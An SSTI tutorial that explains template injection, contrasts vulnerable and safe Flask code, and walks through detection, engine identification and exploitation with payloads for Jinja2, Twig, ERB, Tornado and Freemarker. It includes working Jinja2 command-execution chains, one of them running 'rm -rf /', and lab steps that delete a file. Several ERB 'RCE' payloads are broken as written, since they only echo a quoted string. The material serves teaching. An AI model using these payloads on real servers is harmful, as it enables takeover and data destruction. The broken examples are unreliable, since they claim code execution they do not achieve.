Concept & Theory: SSTI

What is SSTI in Simple Terms?

Imagine you have a website that greets you by name: "Hello, John!" The developer creates a template that looks like: Hello, {{ name }}!

The template engine (like Jinja2, Twig, or ERB) takes this template, replaces {{ name }} with your actual name, and sends the final HTML to your browser. This is how templating works.

SSTI happens when an attacker can inject their own template code instead of just plain data. Instead of submitting "John" as their name, they submit something like {{ 7*7 }}. If the server executes this and returns "49" instead of the literal text {{7*7}}, the application is vulnerable.

Why is This Dangerous? (The Impact)

RCE (Remote Code Execution) - This is the worst-case scenario. The attacker can run any command on the server as if they were sitting at the terminal. This means they can:

  • Read sensitive files (/etc/passwd, source code, database credentials)
  • Modify or delete files
  • Install malware
  • Use the server to attack other systems

Information Disclosure - Even without full RCE, attackers can often:

  • Read system files directly through the template engine
  • Extract configuration details
  • Access source code

The Core Mistake That Causes SSTI

❌ VULNERABLE CODE (Bad Practice)

# Developer builds the template using user input directly
name = request.args.get('name')
template = "Hello, " + name + "!"  # User input becomes PART of the template
return render_template_string(template)

✅ SAFE CODE (Good Practice)

# Template is fixed, user input is passed as data
name = request.args.get('name')
template = "Hello, {{ name }}!"  # Template is fixed
return render_template_string(template, name=name)  # Data is separate

Think of it like SQL injection - if you concatenate user input into a SQL query, it's vulnerable. Same concept here, but with templates.

How Attackers Exploit SSTI: The 3-Stage Methodology

1. DETECT - Is the application vulnerable?

Plaintext Context (Input appears directly in the output)
Your input becomes visible text on the page (like a greeting, comment, or message)

  • Test: Inject a math expression → {{7*7}}
  • If vulnerable: Server returns 49 instead of {{7*7}}

Code Context (Input is inside an existing {{ }} expression)
Your input looks like a normal variable lookup (e.g., ?name=user.first_name)

  • The app might do: {{ user.first_name }} where first_name comes from your input
  • Test: Break out of the expression → user.first_name}}{{7*7}}
  • If vulnerable: You see Peter Wiener49 (the {{7*7}} evaluated to 49)

2. IDENTIFY - Which template engine is it?

Different engines use different syntax:

  • Jinja2 (Python): {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  • Twig (PHP): {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
  • ERB (Ruby): <%= 'id' %>
  • Tornado (Python): {% import os %}{{ os.system('id') }}
  • Freemarker (Java): <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }

How to identify: Send invalid syntax and read error messages. For example, sending <%=foobar%> to an ERB app returns an error containing erb.rb - telling you exactly which engine it is.

3. EXPLOIT - Get RCE or Information Disclosure

Once you know the engine, use its specific syntax to execute commands:

Jinja2 (Python) - RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

ERB (Ruby) - RCE
<%= 'id' %>

Tornado (Python) - RCE
{% import os %}{{ os.system('id') }}
The 3 Variants of SSTI

1. Basic SSTI (Identifying Engine + Exploiting)

Simple detection → Identification → Exploitation

Real Example: You find a "Product Stock Check" that shows "Unfortunately this product is out of stock". The message parameter is vulnerable. You send:

  • ?message=<%= 7*7 %> → Returns "49" (confirms ERB)
  • ?message=<%= 'rm /home/carlos/morale.txt' %> → Deletes the file (solves lab)

2. SSTI with Information Disclosure via Error Messages

Sometimes just triggering errors reveals sensitive information:

Example: Sending invalid syntax like: {{ ''.__class__.__mro__[1].__subclasses__() }}

  • The error message might reveal the entire class hierarchy
  • You can enumerate all loaded classes to find dangerous ones
  • This is how many sandbox escapes are discovered

How it works: Template engines are built on top of programming languages. Using introspection, attackers can climb from a harmless object to dangerous system modules.

# Normal use
d = Dog()
print(d.bark())  # "Woof!"

# Introspection - examining the object itself
print(d.__class__)          # <class '__main__.Dog'>
print(d.__class__.__init__) # Shows the __init__ method
print(d.__class__.__init__.__globals__) # Global namespace - often contains 'os' module

3. SSTI Leading to RCE

The most severe variant - full server takeover.

Payload Chain:

{{7*7}} → Proves SSTI exists
         ↓
{{ config.__class__.__init__.__globals__ }} → Introspection to find os module
         ↓
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }} → Execute OS command
         ↓
{{ config.__class__.__init__.__globals__['os'].popen('rm -rf /').read() }} → Any command possible

Practical Example Walkthrough (ERB SSTI)

  1. Find the input: URL parameter ?message=... that reflects back on the page
  2. Test: ?message=<%= 7*7 %> → Returns "49" (SSTI confirmed)
  3. Identify: Error shows erb.rb → ERB engine
  4. Exploit: ?message=<%= 'rm /home/carlos/morale.txt' %> → Deletes file
